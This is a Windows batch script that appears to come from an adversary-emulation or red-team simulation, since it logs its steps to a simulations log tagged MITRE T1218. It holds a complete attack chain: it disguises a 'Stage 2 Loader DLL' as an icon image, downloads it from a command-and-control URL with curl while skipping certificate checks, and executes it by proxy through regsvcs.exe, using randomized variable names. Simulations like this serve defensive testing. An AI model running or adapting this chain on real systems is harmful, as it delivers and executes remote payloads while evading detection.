@echo off
setlocal enabledelayedexpansion

REM Placeholder constant declarations (random-named SET vars, one per PHR_*)
SET xA3bC9=%APPDATA%\12067\549930c5
SET qWeRtY=4642390d.txt
SET zXcVb1=https://10.0.0.49/stage/2/icon.png?12067-7
SET mNoP2k=ITZEL-S2B
SET rTyU8i=12067
SET jHnM0p=7
SET fGhJ4l=%PUBLIC%\\macula-simulations.log

REM Capture initial timestamp for debug logging
SET tsvar=!DATE!/!TIME!

REM Create output directory if it does not exist
if not exist "!xA3bC9!" (
    mkdir "!xA3bC9!" 2>nul
    echo !tsvar![DEBUG][!mNoP2k!][!rTyU8i!]: mkdir>> "!fGhJ4l!" 2>nul
)

REM Heartbeat fetch: download Stage 2 Loader DLL from C2
echo !tsvar![DEBUG][!mNoP2k!][!rTyU8i!]: heartbeat_start>> "!fGhJ4l!" 2>nul
curl -k -s -o "!xA3bC9!\!qWeRtY!" "!zXcVb1!"
set curl_exit=!ERRORLEVEL!
if !curl_exit! neq 0 (
    echo !tsvar![DEBUG][!mNoP2k!][!rTyU8i!]: heartbeat_fail=!curl_exit!>> "!fGhJ4l!" 2>nul
) else (
    echo !tsvar![DEBUG][!mNoP2k!][!rTyU8i!]: heartbeat_complete>> "!fGhJ4l!" 2>nul
)

REM Change to output directory
echo !tsvar![DEBUG][!mNoP2k!][!rTyU8i!]: chdir_start>> "!fGhJ4l!" 2>nul
cd /d "!xA3bC9!" >nul 2>&1
echo !tsvar![DEBUG][!mNoP2k!][!rTyU8i!]: chdir_result=!ERRORLEVEL!>> "!fGhJ4l!" 2>nul

REM Invoke Stage 2 DLL via regsvcs.exe /U (x64 Framework)
echo !tsvar![DEBUG][!mNoP2k!][!rTyU8i!]: regsvcs_start>> "!fGhJ4l!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U "!qWeRtY!" >NUL 2>&1
set regsvcs_exit=!ERRORLEVEL!
echo !tsvar![DEBUG][!mNoP2k!][!rTyU8i!]: regsvcs_result=!regsvcs_exit!>> "!fGhJ4l!" 2>nul

REM Generate timestamp for TTP log line (millisecond precision)
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set ttp_ts=%%t

REM Build TTP log line
set ttp_result=FAIL
set ttp_error=regsvcs_exit_!regsvcs_exit!
if !regsvcs_exit! equ 0 (
    set ttp_result=OK
    set ttp_error=
)
echo [!ttp_ts!][TTP][!mNoP2k!][!rTyU8i!]: T1218^|System Binary Proxy Execution=!ttp_result!:[!ttp_error!]>> "!fGhJ4l!" 2>&1

REM Final debug line
echo !tsvar![DEBUG][!mNoP2k!][!rTyU8i!]: script_end>> "!fGhJ4l!" 2>nul

endlocal